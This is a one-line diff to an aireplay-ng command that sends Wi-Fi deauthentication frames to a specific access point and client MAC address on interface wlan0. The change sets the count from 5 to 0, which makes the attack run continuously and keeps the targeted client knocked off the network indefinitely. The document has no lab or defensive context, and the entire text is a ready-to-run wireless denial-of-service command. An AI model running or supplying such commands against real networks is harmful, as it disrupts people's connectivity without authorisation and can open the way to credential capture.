@@ -1,1 +1,1 @@
-aireplay-ng -0 5 -a 08:40:F3:2C:14:08 -c 70:a8:d3:6c:66:3c -D wlan0
+aireplay-ng -0 0 -a 08:40:F3:2C:14:08 -c 70:a8:d3:6c:66:3c -D wlan0
